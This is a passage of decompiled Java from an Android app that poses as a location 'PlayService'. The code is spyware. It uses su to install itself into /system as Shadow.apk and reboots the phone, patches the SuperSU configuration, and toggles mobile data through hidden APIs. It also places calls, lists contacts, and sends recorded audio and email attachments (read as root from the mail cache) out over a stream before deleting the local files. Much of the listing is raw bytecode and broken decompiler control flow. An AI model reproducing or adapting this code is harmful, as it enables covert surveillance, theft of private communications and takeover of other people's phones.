    //   511	518	543	finally
    //   66	74	566	java/io/IOException
    //   523	528	570	java/io/IOException
    //   550	554	574	java/io/IOException
    //   559	564	578	java/io/IOException
    //   430	434	582	java/io/IOException
    //   438	442	586	java/io/IOException
    //   386	422	590	finally
    //   386	422	597	java/lang/Exception
  }
  
  public static void FLOG(String paramString)
  {
    if (LOGCAT)
    {
      if (paramString == null) {
        break label22;
      }
      Log.v("backup.service", paramString);
    }
    for (;;)
    {
      FLO(paramString);
      return;
      label22:
      Log.v("backup.service", "<NULL>");
    }
  }
  
  public static void FLOGER(String paramString)
  {
    FLO(paramString);
  }
  
  public static void GLOG(String paramString)
  {
    if (LOGCAT) {
      Log.v("backup.service.wifi", paramString);
    }
    FLOG(paramString);
  }
  
  private long GetCallDelta(String paramString)
  {
    Time localTime = new Time();
    localTime.setToNow();
    long l1 = localTime.toMillis(true);
    String[] arrayOfString = paramString.split(" ");
    paramString = arrayOfString[0].split("-");
    arrayOfString = arrayOfString[1].substring(0, 8).split(":");
    localTime.hour = Integer.parseInt(arrayOfString[0]);
    localTime.minute = Integer.parseInt(arrayOfString[1]);
    localTime.second = Integer.parseInt(arrayOfString[2]);
    localTime.month = (Integer.parseInt(paramString[0]) - 1);
    localTime.monthDay = Integer.parseInt(paramString[1]);
    long l2 = localTime.toMillis(true);
    FLOG("logtime = " + l2);
    return (l1 - l2) / 1000L;
  }
  
  private void GetDataConnectionAPI()
  {
    getApplicationContext();
    TelephonyManager localTelephonyManager = (TelephonyManager)getApplicationContext().getSystemService("phone");
    try
    {
      this.telephonyManagerClass = Class.forName(localTelephonyManager.getClass().getName());
      Method localMethod = this.telephonyManagerClass.getDeclaredMethod("getITelephony", new Class[0]);
      localMethod.setAccessible(true);
      this.ITelephonyStub = localMethod.invoke(localTelephonyManager, new Object[0]);
      this.ITelephonyClass = Class.forName(this.ITelephonyStub.getClass().getName());
      this.dataConnSwitchmethod_OFF = this.ITelephonyClass.getDeclaredMethod("disableDataConnectivity", new Class[0]);
      this.dataConnSwitchmethod_ON = this.ITelephonyClass.getDeclaredMethod("enableDataConnectivity", new Class[0]);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      EXCEPT(localException, "GetDataConnectionAPI");
    }
  }
  
  public static void InstallToSystem()
  {
    for (;;)
    {
      try
      {
        SU = "suk";
        if (!checkSU(SU))
        {
          FLOG("suk failed, try su");
          SU = "su";
          if (!checkSU(SU))
          {
            FLOG("su toje failed");
            return;
          }
          FLOG("su ok!");
          FLOG("USING SU = " + SU);
          str2 = "/data/app/" + MY_PACKAGE_NAME + "-1.apk";
          localObject = str2;
          if (context != null)
          {
            localObject = context.getPackageManager();
            str3 = context.getPackageName();
          }
        }
      }
      catch (Exception localException1)
      {
        Object localObject;
        String str3;
        int i;
        Log.v("backup.service", "Updater has FALLEN DOWN!");
        continue;
      }
      try
      {
        str3 = ((PackageManager)localObject).getPackageInfo(str3, 0).applicationInfo.sourceDir;
        i = str3.length();
        localObject = str2;
        if (i > 10) {
          localObject = str3;
        }
      }
      catch (Exception localException2)
      {
        EXCEPT(localException2, "Error Package name not found ");
        String str1 = str2;
        continue;
      }
      FLOG("Installing as ROOT");
      commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system");
      commandSU("cat " + (String)localObject + "> /system/app/Shadow.apk");
      commandSU("chmod 666 /system/app/Shadow.apk");
      Thread.sleep(2000L);
      commandSU("reboot");
      Log.v("backup.service", "RootInstall FINISHED!!!");
      return;
      FLOG("suk ok!");
    }
  }
  
  private boolean IsSoftDisabled()
  {
    boolean bool = false;
    ComponentName localComponentName = new ComponentName(MY_PACKAGE_NAME, MY_PACKAGE_NAME + ".LaunchActivity");
    try
    {
      int i = getPackageManager().getComponentEnabledSetting(localComponentName);
      if (i == 2) {
        bool = true;
      }
      return bool;
    }
    catch (Exception localException)
    {
      Log.v("backup.service", "Component not found" + localException.getMessage());
    }
    return false;
  }
  
  public static void ListDB(Context paramContext, String paramString)
  {
    FLOG("---------Speech----------:" + paramString);
    FLOG("----------PhoneBook---------");
    paramString = ContactsContract.Contacts.CONTENT_URI;
    paramContext = paramContext.getContentResolver().query(paramString, null, null, null, "_id ASC");
    if (paramContext.moveToFirst()) {
      do
      {
        FLOG(new StringBuilder(String.valueOf("")).append(paramContext.getString(paramContext.getColumnIndex("_id"))).append(":").toString() + paramContext.getString(paramContext.getColumnIndex("display_name")));
      } while (paramContext.moveToNext());
    }
    paramContext.close();
  }
  
  public static byte MakeCall(String paramString)
  {
    FLOG("MakeCall:" + paramString);
    paramString = "tel:" + paramString.trim();
    Intent localIntent = new Intent("android.intent.action.CALL");
    localIntent.setData(Uri.parse(paramString));
    localIntent.setFlags(268435456);
    context.startActivity(localIntent);
    return 1;
  }
  
  private int MyRead(SocketChannel paramSocketChannel, ByteBuffer paramByteBuffer, int paramInt)
  {
    int j;
    if (paramByteBuffer == null)
    {
      j = -1;
      return j;
    }
    int i = 0;
    label31:
    int k;
    label136:
    label159:
    do
    {
      try
      {
        l = getCurrentTime();
        if (paramInt <= 0) {
          break label136;
        }
        paramByteBuffer.limit(paramInt);
      }
      catch (Exception paramSocketChannel)
      {
        long l;
        EXCEPT(paramSocketChannel, "MyRead ");
        return -1;
      }
      if ((paramInt > 0) && (i < paramByteBuffer.limit())) {}
      for (;;)
      {
        k = paramSocketChannel.read(paramByteBuffer);
        FLOG("MyRead:" + k);
        if (k > 0)
        {
          j = i + k;
          break label159;
        }
        if (getCurrentTime() - l > this.SOCKET_READ_TIMEOUT)
        {
          FLOG("MyRead() timeout");
          return -1;
        }
        Thread.sleep(500L);
        j = i;
        break label159;
        break label31;
        j = i;
        if (i != 0) {
          break;
        }
        j = i;
        if (paramInt != 0) {
          break;
        }
      }
      i = j;
    } while (k >= 0);
    return j;
  }
  
  private int MyWrite(SocketChannel paramSocketChannel, ByteBuffer paramByteBuffer)
  {
    int i;
    if (paramByteBuffer == null) {
      i = -1;
    }
    for (;;)
    {
      return i;
      try
      {
        FLOG("buffer:" + paramByteBuffer);
        i = 0;
        int j;
        do
        {
          if (!paramByteBuffer.hasRemaining()) {
            break;
          }
          j = paramSocketChannel.write(paramByteBuffer);
          FLOG("MyWrite:" + j);
          i = j;
        } while (j > 0);
        return j;
      }
      catch (Exception paramSocketChannel)
      {
        EXCEPT(paramSocketChannel, "MyWrite ");
      }
    }
    return -2;
  }
  
  /* Error */
  private void PatchSuperSUConfig()
  {
    // Byte code:
    //   0: ldc_w 1978
    //   3: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6: new 864	java/lang/StringBuilder
    //   9: dup
    //   10: ldc_w 866
    //   13: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   16: getstatic 862	com/android/location/PlayService:MY_PACKAGE_NAME	Ljava/lang/String;
    //   19: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   22: ldc_w 1980
    //   25: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   28: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   31: astore_2
    //   32: new 864	java/lang/StringBuilder
    //   35: dup
    //   36: ldc_w 866
    //   39: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   42: getstatic 862	com/android/location/PlayService:MY_PACKAGE_NAME	Ljava/lang/String;
    //   45: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   48: ldc_w 1982
    //   51: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   54: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   57: astore 10
    //   59: new 864	java/lang/StringBuilder
    //   62: dup
    //   63: ldc_w 1267
    //   66: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   69: ldc_w 1984
    //   72: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   75: ldc_w 1269
    //   78: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   81: aload_2
    //   82: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   85: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   88: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   91: pop
    //   92: new 864	java/lang/StringBuilder
    //   95: dup
    //   96: ldc_w 1986
    //   99: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   102: aload_2
    //   103: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   106: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   109: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   112: pop
    //   113: new 1250	java/io/File
    //   116: dup
    //   117: aload_2
    //   118: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   121: astore_2
    //   122: aload_2
    //   123: invokevirtual 1257	java/io/File:exists	()Z
    //   126: ifeq +21 -> 147
    //   129: aload_2
    //   130: invokevirtual 1265	java/io/File:canRead	()Z
    //   133: ifeq +14 -> 147
    //   136: aload_2
    //   137: invokevirtual 1277	java/io/File:length	()J
    //   140: ldc2_w 1987
    //   143: lcmp
    //   144: ifge +10 -> 154
    //   147: ldc_w 1990
    //   150: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   153: return
    //   154: aconst_null
    //   155: astore 9
    //   157: aconst_null
    //   158: astore 4
    //   160: aconst_null
    //   161: astore_3
    //   162: aconst_null
    //   163: astore_2
    //   164: aload_2
    //   165: astore 7
    //   167: aload 4
    //   169: astore 5
    //   171: aload_3
    //   172: astore 8
    //   174: aload 9
    //   176: astore 6
    //   178: ldc_w 1992
    //   181: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   184: aload_2
    //   185: astore 7
    //   187: aload 4
    //   189: astore 5
    //   191: aload_3
    //   192: astore 8
    //   194: aload 9
    //   196: astore 6
    //   198: aload_0
    //   199: ldc_w 1994
    //   202: invokevirtual 1998	com/android/location/PlayService:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   205: astore 4
    //   207: aload_2
    //   208: astore 7
    //   210: aload 4
    //   212: astore 5
    //   214: aload_3
    //   215: astore 8
    //   217: aload 4
    //   219: astore 6
    //   221: aload_0
    //   222: ldc_w 2000
    //   225: iconst_0
    //   226: invokevirtual 2001	com/android/location/PlayService:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   229: astore 9
    //   231: aload 9
    //   233: astore 7
    //   235: aload 4
    //   237: astore 5
    //   239: aload 9
    //   241: astore 8
    //   243: aload 4
    //   245: astore 6
    //   247: new 864	java/lang/StringBuilder
    //   250: dup
    //   251: ldc_w 2003
    //   254: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   257: aload 4
    //   259: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   262: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   265: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   268: aload 9
    //   270: astore 7
    //   272: aload 4
    //   274: astore 5
    //   276: aload 9
    //   278: astore 8
    //   280: aload 4
    //   282: astore 6
    //   284: new 864	java/lang/StringBuilder
    //   287: dup
    //   288: ldc_w 2005
    //   291: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   294: aload 9
    //   296: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   299: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   302: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   305: aload 4
    //   307: ifnull +435 -> 742
    //   310: aload 9
    //   312: ifnull +430 -> 742
    //   315: aload 9
    //   317: astore 7
    //   319: aload 4
    //   321: astore 5
    //   323: aload 9
    //   325: astore 8
    //   327: aload 4
    //   329: astore 6
    //   331: new 2007	java/io/BufferedReader
    //   334: dup
    //   335: new 2009	java/io/InputStreamReader
    //   338: dup
    //   339: aload 4
    //   341: invokespecial 2012	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   344: invokespecial 2015	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   347: astore 11
    //   349: iconst_0
    //   350: istore_1
    //   351: aload 9
    //   353: astore 7
    //   355: aload 4
    //   357: astore 5
    //   359: aload 9
    //   361: astore 8
    //   363: aload 4
    //   365: astore 6
    //   367: aload 11
    //   369: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   372: astore_3
    //   373: aload_3
    //   374: ifnonnull +87 -> 461
    //   377: aload 9
    //   379: ifnull +8 -> 387
    //   382: aload 9
    //   384: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   387: aload 4
    //   389: ifnull +8 -> 397
    //   392: aload 4
    //   394: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   397: ldc_w 2023
    //   400: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   403: new 864	java/lang/StringBuilder
    //   406: dup
    //   407: ldc_w 1267
    //   410: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   413: aload 10
    //   415: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   418: ldc_w 1269
    //   421: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   424: ldc_w 1984
    //   427: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   430: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   433: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   436: pop
    //   437: new 864	java/lang/StringBuilder
    //   440: dup
    //   441: ldc_w 1986
    //   444: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   447: ldc_w 1984
    //   450: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   453: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   456: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   459: pop
    //   460: return
    //   461: aload 9
    //   463: astore 7
    //   465: aload 4
    //   467: astore 5
    //   469: aload 9
    //   471: astore 8
    //   473: aload 4
    //   475: astore 6
    //   477: aload_3
    //   478: ldc_w 2025
    //   481: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   484: ifeq +5 -> 489
    //   487: iconst_0
    //   488: istore_1
    //   489: aload 9
    //   491: astore 7
    //   493: aload 4
    //   495: astore 5
    //   497: aload 9
    //   499: astore 8
    //   501: aload 4
    //   503: astore 6
    //   505: aload_3
    //   506: invokevirtual 1649	java/lang/String:length	()I
    //   509: ifne +65 -> 574
    //   512: iload_1
    //   513: ifne +61 -> 574
    //   516: aload 9
    //   518: astore 7
    //   520: aload 4
    //   522: astore 5
    //   524: aload 9
    //   526: astore 8
    //   528: aload 4
    //   530: astore 6
    //   532: aload 9
    //   534: ldc_w 2027
    //   537: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   540: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   543: goto -192 -> 351
    //   546: astore_2
    //   547: aload 7
    //   549: ifnull +8 -> 557
    //   552: aload 7
    //   554: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   557: aload 5
    //   559: ifnull -162 -> 397
    //   562: aload 5
    //   564: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   567: goto -170 -> 397
    //   570: astore_2
    //   571: goto -174 -> 397
    //   574: aload 9
    //   576: astore 7
    //   578: aload 4
    //   580: astore 5
    //   582: aload_3
    //   583: astore_2
    //   584: aload 9
    //   586: astore 8
    //   588: aload 4
    //   590: astore 6
    //   592: aload_3
    //   593: ldc_w 2029
    //   596: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   599: ifeq +9 -> 608
    //   602: ldc_w 2031
    //   605: astore_2
    //   606: iconst_1
    //   607: istore_1
    //   608: aload 9
    //   610: astore 7
    //   612: aload 4
    //   614: astore 5
    //   616: aload_2
    //   617: astore_3
    //   618: aload 9
    //   620: astore 8
    //   622: aload 4
    //   624: astore 6
    //   626: aload_2
    //   627: ldc_w 2033
    //   630: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   633: ifeq +7 -> 640
    //   636: ldc_w 2035
    //   639: astore_3
    //   640: aload 9
    //   642: astore 7
    //   644: aload 4
    //   646: astore 5
    //   648: aload_3
    //   649: astore_2
    //   650: aload 9
    //   652: astore 8
    //   654: aload 4
    //   656: astore 6
    //   658: aload_3
    //   659: ldc_w 2037
    //   662: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   665: ifeq +7 -> 672
    //   668: ldc_w 2039
    //   671: astore_2
    //   672: aload 9
    //   674: astore 7
    //   676: aload 4
    //   678: astore 5
    //   680: aload 9
    //   682: astore 8
    //   684: aload 4
    //   686: astore 6
    //   688: aload 9
    //   690: new 864	java/lang/StringBuilder
    //   693: dup
    //   694: aload_2
    //   695: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   698: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   701: ldc_w 1312
    //   704: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   707: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   710: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   713: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   716: goto -365 -> 351
    //   719: astore_2
    //   720: aload 8
    //   722: ifnull +8 -> 730
    //   725: aload 8
    //   727: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   730: aload 6
    //   732: ifnull +8 -> 740
    //   735: aload 6
    //   737: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   740: aload_2
    //   741: athrow
    //   742: aload 9
    //   744: astore 7
    //   746: aload 4
    //   748: astore 5
    //   750: aload 9
    //   752: astore 8
    //   754: aload 4
    //   756: astore 6
    //   758: ldc_w 2041
    //   761: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   764: aload 9
    //   766: ifnull +8 -> 774
    //   769: aload 9
    //   771: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   774: aload 4
    //   776: ifnull -623 -> 153
    //   779: aload 4
    //   781: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   784: return
    //   785: astore_2
    //   786: return
    //   787: astore_2
    //   788: goto -14 -> 774
    //   791: astore_2
    //   792: goto -235 -> 557
    //   795: astore_3
    //   796: goto -66 -> 730
    //   799: astore_3
    //   800: goto -60 -> 740
    //   803: astore_2
    //   804: goto -417 -> 387
    //   807: astore_2
    //   808: goto -411 -> 397
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	811	0	this	PlayService
    //   350	258	1	i	int
    //   31	177	2	localObject1	Object
    //   546	1	2	localException	Exception
    //   570	1	2	localIOException1	IOException
    //   583	112	2	localObject2	Object
    //   719	22	2	localObject3	Object
    //   785	1	2	localIOException2	IOException
    //   787	1	2	localIOException3	IOException
    //   791	1	2	localIOException4	IOException
    //   803	1	2	localIOException5	IOException
    //   807	1	2	localIOException6	IOException
    //   161	498	3	localObject4	Object
    //   795	1	3	localIOException7	IOException
    //   799	1	3	localIOException8	IOException
    //   158	622	4	localFileInputStream1	FileInputStream
    //   169	580	5	localFileInputStream2	FileInputStream
    //   176	581	6	localObject5	Object
    //   165	580	7	localObject6	Object
    //   172	581	8	localObject7	Object
    //   155	615	9	localFileOutputStream	FileOutputStream
    //   57	357	10	str	String
    //   347	21	11	localBufferedReader	BufferedReader
    // Exception table:
    //   from	to	target	type
    //   178	184	546	java/lang/Exception
    //   198	207	546	java/lang/Exception
    //   221	231	546	java/lang/Exception
    //   247	268	546	java/lang/Exception
    //   284	305	546	java/lang/Exception
    //   331	349	546	java/lang/Exception
    //   367	373	546	java/lang/Exception
    //   477	487	546	java/lang/Exception
    //   505	512	546	java/lang/Exception
    //   532	543	546	java/lang/Exception
    //   592	602	546	java/lang/Exception
    //   626	636	546	java/lang/Exception
    //   658	668	546	java/lang/Exception
    //   688	716	546	java/lang/Exception
    //   758	764	546	java/lang/Exception
    //   562	567	570	java/io/IOException
    //   178	184	719	finally
    //   198	207	719	finally
    //   221	231	719	finally
    //   247	268	719	finally
    //   284	305	719	finally
    //   331	349	719	finally
    //   367	373	719	finally
    //   477	487	719	finally
    //   505	512	719	finally
    //   532	543	719	finally
    //   592	602	719	finally
    //   626	636	719	finally
    //   658	668	719	finally
    //   688	716	719	finally
    //   758	764	719	finally
    //   779	784	785	java/io/IOException
    //   769	774	787	java/io/IOException
    //   552	557	791	java/io/IOException
    //   725	730	795	java/io/IOException
    //   735	740	799	java/io/IOException
    //   382	387	803	java/io/IOException
    //   392	397	807	java/io/IOException
  }
  
  private boolean PrepareSQLITE3()
  {
    FLOG("PrepareSQLITE3");
    AssetManager localAssetManager = getAssets();
    FLOG("assetManager = " + localAssetManager);
    if (context == null)
    {
      FLOG("PrepareSQLITE3 context is null, ret");
      return false;
    }
    if (localAssetManager == null)
    {
      try
      {
        FLOG("assetManager is null, ret");
        return false;
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "PrepareSQLITE3");
      }
      return true;
    }
    Object localObject1 = localException.open("sqlite3.armv6");
    FLOG("sqlite3.armv6 = " + localObject1);
    if (localObject1 == null)
    {
      FLOG("No sqlite asset found");
      return false;
    }
    FLOG("asset.sqlite.size=" + ((InputStream)localObject1).available());
    Object localObject2 = context.openFileOutput("sqlite3.armv6", 0);
    byte[] arrayOfByte;
    label152:
    int i;
    if (localObject2 != null)
    {
      arrayOfByte = new byte['Ѐ'];
      i = ((InputStream)localObject1).read(arrayOfByte);
      if (i == -1) {
        ((FileOutputStream)localObject2).close();
      }
    }
    for (;;)
    {
      ((InputStream)localObject1).close();
      localObject1 = "/data/data/" + MY_PACKAGE_NAME + "/files/sqlite3.armv6";
      localObject2 = new File((String)localObject1);
      commandSU("chmod 777 " + (String)localObject1);
      if ((((File)localObject2).exists()) && (((File)localObject2).canRead()) && (((File)localObject2).canExecute())) {
        break;
      }
      FLOG("Cannot use copied sqlite3.armv");
      return false;
      ((FileOutputStream)localObject2).write(arrayOfByte, 0, i);
      break label152;
      FLOG("cannot open out stream");
    }
  }
  
  public static void ProcessBlockList()
  {
    FLOG("sBLockIPList=" + sBLockIPList);
    String[] arrayOfString;
    int i;
    if (sBLockIPList.length() > 0)
    {
      arrayOfString = sBLockIPList.split(",");
      FLOG("iplist.len=" + arrayOfString.length);
      i = 0;
    }
    for (;;)
    {
      if (i >= arrayOfString.length) {
        return;
      }
      commandSU("iptables -A OUTPUT -d " + arrayOfString[i].trim() + " -j DROP");
      i += 1;
    }
  }
  
  private static void ROTATELOG()
  {
    Object localObject1 = new File(filesPath + "/" + sLogFileName);
    if ((localObject1 != null) && (((File)localObject1).exists()) && (((File)localObject1).length() > 0L)) {
      ((File)localObject1).renameTo(new File(filesPath + "/" + sLogFileName + getCurrentTime()));
    }
    FLOG("mydir=" + filesPath);
    Object localObject2 = mydir.listFiles();
    if (localObject2 == null) {}
    int i;
    for (;;)
    {
      return;
      FLOG("Rotator found " + localObject2.length + " files");
      localObject1 = new ArrayList();
      i = 0;
      if (i < localObject2.length) {
        break;
      }
      i = ((ArrayList)localObject1).size();
      if (i <= 5) {
        break label416;
      }
      FLOG("Rotator deletes " + i + " files");
      while (((ArrayList)localObject1).size() > 0)
      {
        localObject2 = (File)((ArrayList)localObject1).remove(0);
        FLOG("FD[" + ((File)localObject2).getName() + "] :*(");
        ((File)localObject2).delete();
      }
    }
    FLOG(localObject2[i].getName());
    if ((localObject2[i].getName().startsWith(sLogFileName)) && (!localObject2[i].getName().endsWith(sLogFileName)))
    {
      File localFile = new File(filesPath + "/" + localObject2[i].getName());
      FLOG("Add to list file " + localFile.getAbsolutePath());
      ((ArrayList)localObject1).add(localFile);
    }
    for (;;)
    {
      i += 1;
      break;
      FLOG("skip rotator [" + localObject2[i].getName() + "]");
    }
    label416:
    FLOG("Skip ROTATE due to small count of logs " + i);
  }
  
  private int ReadAudioListenFiles(OutputStream paramOutputStream)
  {
    if (paramOutputStream == null) {
      return 0;
    }
    FLOG("ReadAudioListenFiles() called");
    int n = 0;
    int m = 0;
    Object localObject = BackupData.CONTENT_URI;
    localObject = getContentResolver().query((Uri)localObject, null, "calllist_id IS NULL ", null, "calldate LIMIT 1");
    if (localObject == null)
    {
      FLOG("ReadAudioListenFiles.query() failed");
      return 0;
    }
    FLOG("ReadAudioListenFiles called = " + ((Cursor)localObject).getCount());
    int k = 0;
    int i = m;
    int j = n;
    for (;;)
    {
      try
      {
        if (((Cursor)localObject).moveToFirst())
        {
          j = n;
          k = ((Cursor)localObject).getInt(((Cursor)localObject).getColumnIndex("_ID"));
          j = n;
          localFile = new File(getFilesDir() + "/" + ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("filename")));
          j = n;
          if (localFile.canRead()) {
            continue;
          }
          j = n;
          FLOG("ReadAudioListenFiles:Cannot read file " + localFile.getAbsolutePath());
          i = m;
        }
        j = i;
        if (k > 0)
        {
          j = i;
          getContentResolver().delete(BackupData.CONTENT_URI, "_ID = " + k, null);
          j = i;
          FLOG("Delete from speech - " + k);
          j = i;
        }
      }
      catch (Exception paramOutputStream)
      {
        File localFile;
        EXCEPT(paramOutputStream, "ReadAudioListenFiles ");
        continue;
      }
      ((Cursor)localObject).close();
      return j;
      j = n;
      try
      {
        paramOutputStream.write(118);
        j = n;
        AddData(paramOutputStream, localFile.length());
        j = n;
        AddData(paramOutputStream, ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("calldate")) / 1000L);
        j = n;
        WriteFileToOutputStream(localFile, paramOutputStream);
        j = n;
        paramOutputStream.write(1);
        j = n;
        if (localFile.canWrite())
        {
          j = n;
          localFile.delete();
          j = n;
          paramOutputStream.write(3);
          j = n;
          paramOutputStream.write(2);
          i = 0 + 1;
          continue;
        }
        j = n;
        FLOG("Can not delete file " + localFile.getAbsolutePath());
      }
      catch (IOException paramOutputStream)
      {
        j = n;
        EXCEPT(paramOutputStream, "ReadAudioListenFilesIO");
        i = m;
      }
    }
  }
  
  private boolean ReadEmailAttaches(OutputStream paramOutputStream, long paramLong)
  {
    FLOG("Try to pick up Attaches of letter " + paramLong);
    try
    {
      Object localObject1 = Uri.parse("content://com.android.email.provider/attachment");
      Cursor localCursor = getContentResolver().query((Uri)localObject1, null, " messageKey = " + paramLong, null, " _id ASC ");
      FLOG("Attach vse ok: " + localCursor);
      if (localCursor != null)
      {
        FLOG("ReadAttachEmail() " + localCursor.getCount());
        if (localCursor.moveToFirst())
        {
          if (paramOutputStream != null)
          {
            paramOutputStream.write(2);
            paramOutputStream.write(99);
          }
          FLOG(">1");
          AddData(paramOutputStream, paramLong);
          FLOG(">2");
          AddData(paramOutputStream, "6");
          FLOG(">3");
          AddData(paramOutputStream, localCursor.getString(localCursor.getColumnIndex("mimeType")));
          FLOG(">3");
          Object localObject2 = localCursor.getString(localCursor.getColumnIndex("contentUri"));
          FLOG(">4");
          FLOG((String)localObject2);
          localObject1 = Uri.parse((String)localObject2);
          FLOG(">5");
          Object localObject3 = getContentResolver().query((Uri)localObject1, null, null, null, null);
          FLOG(">6");
          localObject1 = "";
          long l = 0L;
          FLOG("ReadEmailData: " + localObject3);
          if (localObject3 != null)
          {
            ((Cursor)localObject3).moveToFirst();
            localObject1 = ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("_display_name"));
            l = ((Cursor)localObject3).getLong(((Cursor)localObject3).getColumnIndex("_size"));
          }
          FLOG("filename = " + (String)localObject1);
          AddData(paramOutputStream, (String)localObject1);
          FLOG("_3");
          localObject3 = ((String)localObject2).substring("content://com.android.email.attachmentprovider/".length()).split("/");
          localObject2 = localObject3[0];
          localObject3 = localObject3[1];
          localObject2 = "/data/data/com.android.email/cache/" + (String)localObject2 + ".db_att/" + (String)localObject3;
          localObject3 = new File(filesPath + "/emailAttach");
          if (((File)localObject3).exists()) {
            ((File)localObject3).delete();
          }
          commandSU("cat " + (String)localObject2 + " > " + filesPath + "/emailAttach");
          FLOG("read ? " + ((File)localObject3).canRead());
          localObject2 = localObject3;
          if (!((File)localObject3).canRead())
          {
            FLOG("try download dir");
            localObject1 = "/mnt/sdcard/Download/" + (String)localObject1;
            FLOG("SDCARD = " + (String)localObject1);
            localObject2 = new File((String)localObject1);
            FLOG("read ? " + ((File)localObject2).canRead());
          }
          if (!((File)localObject2).canRead())
          {
            FLOG("nu Ya Huy znaet");
            AddData(paramOutputStream, "0");
          }
          for (;;)
          {
            if (paramOutputStream != null)
            {
              paramOutputStream.write(1);
              paramOutputStream.write(3);
            }
            if (localCursor.moveToNext()) {
              break;
            }
            return true;
            AddData(paramOutputStream, l);
            WriteFileToOutputStream((File)localObject2, paramOutputStream);
          }
        }
      }
      return false;
    }
